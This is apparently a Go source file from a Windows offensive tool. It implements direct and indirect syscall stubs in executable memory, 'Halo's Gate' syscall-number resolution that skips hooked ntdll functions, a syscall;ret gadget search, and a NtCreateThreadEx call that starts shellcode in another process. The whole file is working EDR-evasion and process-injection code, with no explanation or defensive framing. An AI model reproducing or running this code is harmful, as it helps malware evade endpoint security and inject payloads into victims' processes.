package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ── Syscall Manager ──
// Caches resolved SSNs and built stubs to avoid re-parsing ntdll on every inject.

type syscallManager struct {
	stubs map[string]uintptr
}

func newSyscallManager() *syscallManager {
	return &syscallManager{stubs: make(map[string]uintptr)}
}

func (sm *syscallManager) getStub(funcName string) (uintptr, error) {
	if addr, ok := sm.stubs[funcName]; ok {
		return addr, nil
	}
	ssn, err := findSyscallNumHalo(funcName)
	if err != nil {
		ssn, err = findSyscallNum(funcName)
		if err != nil {
			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
		}
	}
	code := []byte{
		0x4C, 0x8B, 0xD1,
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24),
		0x0F, 0x05,
		0xC3,
	}
	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc for %s stub failed", funcName)
	}
	for i := 0; i < len(code); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = code[i]
	}
	sm.stubs[funcName] = addr
	return addr, nil
}

func (sm *syscallManager) freeStubs() {
	for name, addr := range sm.stubs {
		procVirtualFree.Call(addr, 0, 0x8000)
		delete(sm.stubs, name)
	}
}

func (sm *syscallManager) getIndirectStub(funcName string) (uintptr, error) {
	cacheKey := "indirect:" + funcName
	if addr, ok := sm.stubs[cacheKey]; ok {
		return addr, nil
	}
	ssn, err := findSyscallNumHalo(funcName)
	if err != nil {
		ssn, err = findSyscallNum(funcName)
		if err != nil {
			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
		}
	}
	gadget, err := findSyscallGadget()
	if err != nil {
		return 0, err
	}
	code := []byte{
		0x4C, 0x8B, 0xD1,
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24),
		0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
	}
	code = append(code, byte(gadget), byte(gadget>>8), byte(gadget>>16), byte(gadget>>24),
		byte(gadget>>32), byte(gadget>>40), byte(gadget>>48), byte(gadget>>56))

	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc for indirect %s stub failed", funcName)
	}
	for i := 0; i < len(code); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = code[i]
	}
	sm.stubs[cacheKey] = addr
	return addr, nil
}

// Halo's Gate: find SSN but verify syscall;ret is intact (not hooked)
func findSyscallNumHalo(funcName string) (uint32, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}
	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
	if exportDir.virtualAddress == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))

	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))

	for i := uint32(0); i < exp.numberOfNames; i++ {
		namePtr := base + uintptr(nameArray[i])
		var name string
		for j := 0; ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			name += string(c)
		}
		if name == funcName {
			ord := ordArray[i]
			funcRVA := funcArray[ord]
			funcAddr := base + uintptr(funcRVA)

			code := (*[64]byte)(unsafe.Pointer(funcAddr))[:]
			for k := 0; k < len(code)-5; k++ {
				if code[k] == 0xB8 {
					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
						if code[j] == 0x0F && code[j+1] == 0x05 {
							if j+2 < len(code) && code[j+2] == 0xC3 {
								return ssn, nil
							}
							continue
						}
					}
				}
			}
			return 0, fmt.Errorf("Halo's Gate: valid syscall+ret not found in %s", funcName)
		}
	}
	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
}

func findSyscallGadget() (uintptr, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	ntHdrOffset := uintptr(dos.eLfanew)
	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + uintptr(unsafe.Offsetof(ntHdr.optionalHeader)) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))

	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		name := string(sec.name[:])
		if name == ".text" {
			start := base + uintptr(sec.virtualAddress)
			size := uintptr(sec.sizeOfRawData)
			if size == 0 {
				size = uintptr(sec.virtualSize)
			}
			if size > 1024*1024 {
				size = 1024 * 1024
			}
			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
			for i := 0; i < len(text)-2; i++ {
				if text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3 {
					return start + uintptr(i), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("syscall;ret gadget not found in ntdll")
}

func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr uintptr) (uintptr, error) {
	stub, err := sm.getStub("NtCreateThreadEx")
	if err != nil {
		return 0, err
	}
	var hThread uintptr
	r1, _, _ := syscall.Syscall9(stub, 8,
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,
		0,
		hProc,
		shellcodeAddr,
		0,
		0,
		0,
		0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtCreateThreadEx failed: 0x%X", r1)
	}
	return hThread, nil
}
